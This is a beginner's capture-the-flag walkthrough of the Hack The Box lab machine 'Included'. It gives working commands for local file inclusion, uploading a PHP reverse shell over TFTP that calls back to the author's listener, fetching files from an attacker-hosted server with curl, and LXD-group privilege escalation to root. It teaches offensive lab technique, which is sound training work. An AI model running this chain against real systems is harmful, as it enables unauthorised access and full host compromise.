# HTB Included - Beginner-Friendly Walkthrough

## Goal

This walkthrough documents how I solved the Hack The Box machine **Included**.

I’m keeping the reasoning, failed attempts, Google-search logic, and explanations because the goal is not only to show the final commands, but to explain how each discovery led to the next step.

This machine covers:

* Nmap recon
* Local File Inclusion / Path Traversal
* Reading Linux configuration files
* TFTP file upload
* PHP reverse shell
* Shell upgrade
* Linux enumeration
* LXD group privilege escalation

---

## 1. Recon

I started with a basic Nmap scan:

```bash
nmap -sC -sV 10.129.25.192
```

Result:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Requested resource was http://10.129.25.192/?file=home.php
```

The interesting part is the URL:

```text
/?file=home.php
```

This tells us the application is loading a file through the `file` parameter.

When I see something like this, my next thought is:

> Can I change the file path and make the server read something else?

So I tested `/etc/passwd`.

---

## 2. Testing Path Traversal / LFI

Request:

```http
GET /?file=/etc/passwd HTTP/1.1
```

The server returned `/etc/passwd`.

This confirms that the application can read local files from the server.

This is useful because configuration files often reveal services, users, paths, and sometimes credentials.

In `/etc/passwd`, these entries stood out:

```text
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

This gave me two useful clues:

1. There is a user called `mike`.
2. There is a `tftp` user, which suggests TFTP may be installed or configured.

---

## 3. Researching TFTP

At this point, I searched what TFTP is and how it works.

TFTP means **Trivial File Transfer Protocol**.

Important things I learned:

* It is used to transfer files.
* It usually runs on UDP port 69.
* It does not require authentication.
* It has very limited commands.
* It commonly supports `get` and `put`.
* It usually does not allow directory listing like FTP.

My first scan only checked common TCP ports, so I tested UDP port 69:

```bash
sudo nmap -sU -p 69 10.129.25.192
```

Result:

```text
69/udp open|filtered tftp
```

Now I needed to understand where TFTP stores files and whether uploads are allowed.

From research, I found common TFTP configuration paths:

```text
/etc/default/tftpd-hpa
/etc/sysconfig/tftp
/etc/conf.d/tftpd
```

Since the target is Ubuntu, I tested:

```http
GET /?file=/etc/default/tftpd-hpa HTTP/1.1
```

Result:

```text
TFTP_USERNAME="tftp"
TFTP_DIRECTORY="/var/lib/tftpboot"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="-s -l -c"
```

This was very important.

`TFTP_DIRECTORY` tells us where uploaded files are stored:

```text
/var/lib/tftpboot
```

The `-c` option means file creation/upload is allowed.

So now the idea became:

> If I can upload a PHP file into `/var/lib/tftpboot`, and the web app can include files using the `file` parameter, maybe I can include and execute my uploaded PHP file.

---

## 4. PHP Reverse Shell

The web application is PHP-based, so I used a PHP reverse shell.

I used the Pentestmonkey PHP reverse shell and changed:

```php
$ip = '10.10.14.49';
$port = 1234;
```

Then I uploaded it with TFTP:

```bash
tftp 10.129.25.192
put shell.php
quit
```

Before triggering it, I started a listener:

```bash
nc -lvnp 1234
```

Then I visited:

```text
http://10.129.25.192/?file=/var/lib/tftpboot/shell.php
```

The target connected back to my listener, and I got a shell as `www-data`.

---

## 5. Upgrading the Shell

The first shell was limited:

```text
/bin/sh: 0: can't access tty; job control turned off
```

I upgraded it with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now I had a better shell.

I checked who I was:

```bash
id
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So I was the web server user, not a real system user yet.

---

## 6. Enumerating the Web Directory

I checked the web directory:

```bash
cd /var/www/html
ls -la
```

Interesting files:

```text
.htaccess
.htpasswd
index.php
home.php
```

The `.htpasswd` file contained:

```text
mike:Sheffield19
```

So I tried switching to Mike:

```bash
su mike
```

Password:

```text
Sheffield19
```

It worked.

Now I checked Mike’s groups:

```bash
groups
```

Result:

```text
mike lxd
```

This was the next important clue.

---

## 7. Researching LXD Privilege Escalation

I searched what the `lxd` group means.

What I learned:

* LXD is used to manage Linux containers.
* The `lxc` command is the client used to talk to LXD.
* LXD runs with high privileges on the host.
* A user in the `lxd` group can create and manage containers.
* If that user creates a privileged container and mounts the host filesystem inside it, they can access the host files as root.

This is not a classic exploit where we break software.

It is a privilege abuse caused by unsafe group membership.

Mike is not allowed to use sudo:

```bash
sudo -l
```

Result:

```text
Sorry, user mike may not run sudo on included.
```

But Mike is in the `lxd` group, and that gives another path to root.

---

## 8. LXD Setup and First Mistake

I checked existing containers and images:

```bash
lxc ls
lxc image ls
```

There were no images.

At first, I tried:

```bash
lxc launch ubuntu:18.04 falcor
```

It failed:

```text
Temporary failure in name resolution
```

After looking at the error, I understood the problem.

The victim was trying to download an Ubuntu image from the internet, but it could not resolve the domain name.

So the issue was not the command itself.

The issue was:

> The target machine does not have internet/DNS access, and LXD has no local image to use.

So I needed to provide an image manually.

---

## 9. Downloading Alpine on My Machine

On my attack machine, I downloaded the Alpine image builder:

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
ls
```

I found the image:

```text
alpine-v3.13-x86_64-20210218_0139.tar.gz
```

To transfer it to the victim, I started a Python HTTP server from the directory containing the file:

```bash
python3 -m http.server 8000
```

Then from Mike’s shell on the victim:

```bash
curl http://10.10.14.49:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz -o alpine-v3.13-x86_64-20210218_0139.tar.gz
```

I confirmed the file was there:

```bash
ls
```

---

## 10. Importing the Image into LXD

Now that the Alpine image was on the victim machine, I imported it into LXD’s image store:

```bash
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz
```

Then I checked:

```bash
lxc image ls
```

Result:

```text
FINGERPRINT  DESCRIPTION
cd73881adaac alpine v3.13
```

This does not create a container yet.

It only tells LXD:

> Here is an operating system image you can use to create containers.

The fingerprint `cd73881adaac` is the image ID I used in the next step.

---

## 11. Creating a Privileged Container

Command:

```bash
lxc init cd73881adaac r00t -c security.privileged=true
```

Breaking it down:

```text
lxc
```

Use the LXC client to talk to LXD.

```text
init
```

Create a container, but do not start it yet.

```text
cd73881adaac
```

Use the Alpine image we imported.

```text
r00t
```

Name the new container `r00t`.

```text
-c security.privileged=true
```

Create it as a privileged container.

This matters because a normal container has a restricted root user.
A privileged container has a root user that is trusted much more by the host.

---

## 12. Mounting the Host Filesystem

Command:

```bash
lxc config device add r00t host-root disk source=/ path=/mnt/root recursive=true
```

This is the key command.

Breaking it down:

```text
lxc config
```

Change the container configuration.

```text
device add
```

Add a new device to the container.

```text
r00t
```

Apply this to the container named `r00t`.

```text
host-root
```

Name of the device we are adding.

```text
disk
```

The device type is storage/disk.

```text
source=/
```

Use the host machine’s root filesystem.

```text
path=/mnt/root
```

Inside the container, show the host filesystem at `/mnt/root`.

```text
recursive=true
```

Include subdirectories too.

The logic is:

> We are attaching the host’s filesystem to our privileged container. Once inside the container as root, we can browse the host filesystem through `/mnt/root`.

---

## 13. Starting and Entering the Container

Start the container:

```bash
lxc start r00t
```

Enter it:

```bash
lxc exec r00t /bin/sh
```

Inside the container:

```bash
id
```

Result:

```text
uid=0(root) gid=0(root)
```

Now I was root inside the container.

To access the real host filesystem, I checked:

```bash
ls /mnt/root
```

This showed the host filesystem:

```text
bin boot dev etc home root usr var
```

The root flag was not in `/root` inside the container.

That was the container’s own root directory.

The host’s root directory was mounted at:

```text
/mnt/root/root
```

So I ran:

```bash
cd /mnt/root/root
ls -la
cat root.txt
```

Root flag obtained.

---

## Main Lessons

This machine taught me:

* Always pay attention to URL parameters like `file=`.
* Use LFI to read configuration files, not only `/etc/passwd`.
* If a service appears in `/etc/passwd`, research it.
* TFTP uses UDP, so a normal TCP scan can miss it.
* Google/searching documentation is part of the process.
* Error messages matter. The Ubuntu container failed because the target could not download the image.
* LXD privilege escalation works because the user can create a privileged container and mount the host filesystem.
* The `lxd` group should be treated as highly privileged.

## Final Attack Path

```text
Nmap
→ Web app with file parameter
→ LFI confirmed with /etc/passwd
→ TFTP user discovered
→ TFTP config file read
→ Upload allowed in /var/lib/tftpboot
→ PHP reverse shell uploaded
→ Reverse shell as www-data
→ .htpasswd found
→ Credentials for mike
→ mike belongs to lxd group
→ Import Alpine image
→ Create privileged container
→ Mount host filesystem
→ Read root flag
```
